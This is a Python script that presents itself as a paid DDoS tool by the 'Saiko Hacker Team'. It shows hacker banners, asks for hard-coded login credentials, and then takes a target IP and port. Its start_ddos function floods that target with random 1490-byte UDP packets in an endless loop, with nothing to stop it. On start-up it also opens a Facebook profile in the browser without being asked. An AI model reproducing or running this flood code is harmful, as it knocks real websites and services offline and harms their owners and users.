import os
import time
import socket
import random

def print_logo():
    os.system("clear")
    print("\033[92m")
    print("   ╔══════════════════════════════════════════════════════════════╗")
    print("   ║                   Saiko Hacker Team {R.M}                    ║")
    print("   ╚══════════════════════════════════════════════════════════════╝")
    print("\n")
    print("   ______                        _____       __  __    ______        ")
    print(" /_  __/__  ____ _____ ___     / ___/      / / / /   /_  __/            ")
    print("  / / / _ \/ __ `/ __ `__ \    \__ \______/ /_/ /_____/ /   ")
    print("  / / /  __/ /_/ / / / / / /   ___/ /_____/ __  /_____/ /       ")
    print(" /_/  \___/\__,_/_/ /_/ /_/   /____/     /_/ /_/     /_/         ")
    print("\033[36m")
    print("   ╔══════════════════════════════════════════════════════════════════════╗")
    print("   ║                    DEVELOPER INFORMATION                             ║")
    print("   ╠══════════════════════════════════════════════════════════════════════╣")
    print("   ║  👤 Developer     : RM RONY ALI (RAT)                                ║")
    print("   ║  🖊️  Team          : SAIKO HACKER TEAM {R.M}                          ║")
    print("   ║  🔗 Tool's Type   : PAID                                             ║")
    print("   ║  📘 Tool's Version: 0.2                                              ║")
    print("   ║  🏛️  Tool's Status : DDOS-ATTACK                                      ║")
    print("   ╠══════════════════════════════════════════════════════════════════════╣")
    print("   ║ 🔥 Red Team : We Hack To Defend The Digital World                    ║")
    print("   ╚══════════════════════════════════════════════════════════════════════╝")
    print("\n")

os.system("xdg-open https://www.facebook.com/profile.php?id=61551487702871&mibextid=ZbWKwL")
def login():
    print("\033[92m")
    print("   ╔════════════════════════════╗")
    print("   ║      LOGIN TO ATTACK       ║")
    print("   ╚════════════════════════════╝")
    attempts = 0
    while attempts < 99:
        username = input("\n   ➤ Enter Username: ")
        password = input("   ➤ Enter Password: ")
        if username == "S-H-T" and password == "S-H-T":
            print("\n   ✅ Access Granted!\n")
            time.sleep(1)
            os.system("clear")
            return True
        else:
            attempts += 1
            print(f"\n   ❌ Invalid Credentials! Attempts Left: {99 - attempts}\n")
    print("\n   ❌ Access Denied! Exiting...\n")
    exit()

def loading_bar():
    print("\033[91m")
    for i in range(101):
        time.sleep(0.01)
        print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print("\n\n")

def get_target_details():
    print("\033[93m")
    print("   ╔══════════════════════════════════════════╗")
    print("   ║          ENTER TARGET DETAILS            ║")
    print("   ╚══════════════════════════════════════════╝")
    url = input("\n   ➤ Enter Target Website URL: ")
    ip = input("   ➤ Enter Target IP Address: ")
    port = int(input("   ➤ Enter Target Port Number: "))
    print("\n   ✅ Details received successfully.\n")
    return url, ip, port

def print_ddos_banner():
    print("\033[96m")
    print("   ╔══════════════════════════════════════════╗")
    print("   ║               TEAM S-H-T DDOS TOOL       ║")
    print("   ╚══════════════════════════════════════════╝")
    print("\n")
    print(" _______  __    __    ______  __  ___    ____    ____  ______    __    __  ")
    print("|   ____||  |  |  |  /      ||  |/  /    \   \  /   / /  __  \  |  |  |  | ")
    print("|  |__   |  |  |  | |  ,----'|  '  /      \   \/   / |  |  |  | |  |  |  | ")
    print("|   __|  |  |  |  | |  |     |    <        \_    _/  |  |  |  | |  |  |  | ")
    print("|  |     |  `--'  | |  `----.|  .  \         |  |    |  `--'  | |  `--'  | ")
    print("|__|      \______/   \______||__|\__\        |__|     \______/   \______/  ")

def start_ddos(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    packet_count = 0
    print(f"\n   🚀 S-H-T Attack started on {ip} through port {port}")
    while True:
        sock.sendto(bytes_data, (ip, port))
        packet_count += 1
        print(f"\033[35m   ➤ Team S-H-T #{packet_count} to {ip} on port {port}")

def main():
    print_logo()
    if login():
        print_ddos_banner()
        loading_bar()
        url, ip, port = get_target_details()
        start_ddos(ip, port)
    else:
        print("\033[91m   ❌ Access Denied! Please try logging in again.")

if __name__ == "__main__":
    main()
